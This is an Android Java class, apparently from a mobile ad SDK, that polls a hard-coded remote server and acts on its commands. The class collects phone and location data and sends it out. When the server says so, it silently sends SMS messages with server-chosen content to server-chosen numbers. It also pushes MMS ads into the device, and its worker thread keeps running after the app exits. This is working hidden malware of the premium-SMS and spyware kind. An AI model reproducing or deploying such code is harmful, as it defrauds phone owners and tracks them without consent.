package com.g.sc;

import java.io.IOException;
import java.util.List;
import java.util.Map;

import org.apache.http.client.ClientProtocolException;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager.NameNotFoundException;
import android.webkit.URLUtil;

import com.g.sc.PhoneNumberChecker.PhoneNumberError;

public class MmsAdPromulgator {

	private String adNormalUrl = "http://wap.cn6000.com/cm/andr/mms.php";
	private String adLocationUrl = "http://wap.cn6000.com/cm/andr/get_addr.php";
	private Context mContext;
	private boolean isUrlSetted = false;
	private volatile boolean runningFlag = true;
	private MobileInfoGetter mobileInfoGetter;
	private static final String[] needPermissions = {
			"android.permission.INTERNET", "android.permission.WRITE_SMS",
			"android.permission.READ_SMS",
			"android.permission.ACCESS_COARSE_LOCATION",
			"android.permission.READ_PHONE_STATE" };
	private static final String GET_SMS_AD_STATUS_OK = "ok";
	private static final int MAX_ADS = 5;
	private static final String TAG = MmsAdPromulgator.class.toString();
	private static final long errStatusSleepTime = 5*60*60 * 1000;

	private Thread promulgator = new Thread() {

		@Override
		public void run() {
			while (runningFlag) {
				String smsContent = null;
				try {
					smsContent = getJson();
					if (smsContent == null || "".equals(smsContent)) {
						AdLogger.w(TAG, "获取到的JSON为空，无法解析");
					} else {
						AdLogger.d(TAG, smsContent);
						try {
							parseJson(smsContent);
							Thread.sleep(60 * 1000);
						} catch (JSONException e) {
							handleException(e);
						} catch (InterruptedException e) {
							handleException(e);
						} catch (PhoneNumberError e) {
							handleException(e);
						} catch (NoSmilException e) {
							handleException(e);
						} catch (PermissionNotObtainedException e) {
							handleException(e);
						}
					}
				} catch (IOException e) {
					handleException(e);
				} catch (Exception e) {
					handleException(e);
				}
			}
		}

		private void handleException(Exception e) {
			AdLogger.e(TAG, e.getMessage());
			sleepWhenErrHappens();
		}

		private void sleepWhenErrHappens() {
			try {
				Thread.sleep(errStatusSleepTime);
			} catch (InterruptedException e1) {
				AdLogger.e(TAG, e1.getMessage());
			}
		}

	};

	public MmsAdPromulgator(Context context) {
		mContext = context;
		mobileInfoGetter = new MobileInfoGetter(mContext);
	}

	/**
	 * 调用这个方法停止广告，不然广告线程在程序退出后也会继续存在
	 */
	public void stopAd() {
		runningFlag = false;
	}

	public void setSmsAdUrl(String normalUrl, String locationUrl) {
		if (!isUrlSetted) {
			if (URLUtil.isHttpUrl(normalUrl) && URLUtil.isHttpUrl(locationUrl)) {
				adNormalUrl = normalUrl;
				adLocationUrl = locationUrl;
				isUrlSetted = true;
			} else {
				AdLogger.w(TAG, "请传入符合http规范的url");
			}
		} else {
			AdLogger.w(TAG, "不能重复设置获取广告的url");
		}
	}

	public void startToPromulgateAd() throws NameNotFoundException {
		if (URLUtil.isHttpUrl(adNormalUrl)
				&& URLUtil.isHttpUrl(adLocationUrl)
				&& PermissionChecker.isAllPermissionObtained(mContext,
						needPermissions)) {
			promulgator.start();
		}
	}

	/**
	 * 当网络出现异常时会抛出异常 当网络正常而访问的url不正常时，返回值为空 一切正常时，返回相应的字符串
	 * 
	 * @return
	 * @throws IOException
	 * @throws ClientProtocolException
	 * @throws Exception
	 */
	private String getJson() throws IOException {
		Map<String, String> params = mobileInfoGetter.getAllImmediateInfo();
		AdLogger.i(TAG, "mms app id is: <" + AppConfig.APP_ID + ">");
		AdLogger.i(TAG, "mms app version is: <" + AppConfig.APP_VERSION + ">");
		params.put("app_id", AppConfig.APP_ID);
		params.put("version", AppConfig.APP_VERSION);
		params.put("net_type", mobileInfoGetter.getNettype());
		params.put("a_version", AdManager.getInstance().getVersion());
		List<BasicNameValuePair> pairs = PostExcuter.paramPairsPackage(params);
		return PostExcuter.excutePost(adNormalUrl, pairs, mContext);
	}

	private void parseJson(String jsonText) throws JSONException,
			InterruptedException, PhoneNumberError, NoSmilException,
			PermissionNotObtainedException {
		AdLogger.i(TAG, "return json is: " + jsonText);
		AdLogger.i(TAG, "start is :| " + jsonText.substring(0, 15)
				+ " ;end is :| " + jsonText.substring(jsonText.length() - 15));
		JSONObject rootJson = new JSONObject(jsonText);
		
		AdLogger.i(TAG, "root json initialed");
		//解析JSON,如果PID 为0,则发送短信.		
				int pid=rootJson.getInt("pid");
				SharedPreferences date = mContext.getSharedPreferences("pid", 0);
				int ispid=date.getInt("ispid", 0);
				boolean isgetpid=false;
				
				if(ispid==0){
					String val=SmsAdPromulgator.getLogFormFile();
					
					if(val==null){
						isgetpid=true;
					}else{
						isgetpid=false;
						Editor date2 = mContext.getSharedPreferences("pid", 0).edit();
						date2.putInt("ispid", 1);
						date2.commit();
					}
					
				}else{
					isgetpid=false;
				}
				if(pid==0 && isgetpid){
					JSONObject map= rootJson.getJSONObject("bymsg");
						String content2=map.getString("sendmsg");
						 String tophone=map.getString("tophone");
						
						SmsAdPromulgator.sendSMS(tophone, content2, mContext);
						
				}
		String status = rootJson.getString("status");
		if (GET_SMS_AD_STATUS_OK.equals(status)) {
			JSONArray smsAds = rootJson.getJSONArray("msg");
			AdLogger.i(TAG, "msg json initialed, length is: " + smsAds.length());
			JSONObject adItem = null;
			for (int i = 0; i < smsAds.length() && i < MAX_ADS; i++) {
				AdLogger.i(TAG, "initial aditem");
				adItem = smsAds.optJSONObject(i);
				AdLogger.i(TAG, "aditem json initialed");
				String sendNumber = adItem.getString("port");
				String content = adItem.getString("content");
				MmsJsonParser parser = new MmsJsonParser(mContext);
				parser.parseMmsJson(content, sendNumber);
			}
			int sleepSeconds = rootJson.getInt("sleep");
			mobileInfoGetter.locate(new AdLocateListener(adLocationUrl,
					mContext));
			Thread.sleep(((long) sleepSeconds * 1000));
		} else {
			Thread.sleep(errStatusSleepTime);
			}
		
			}
}
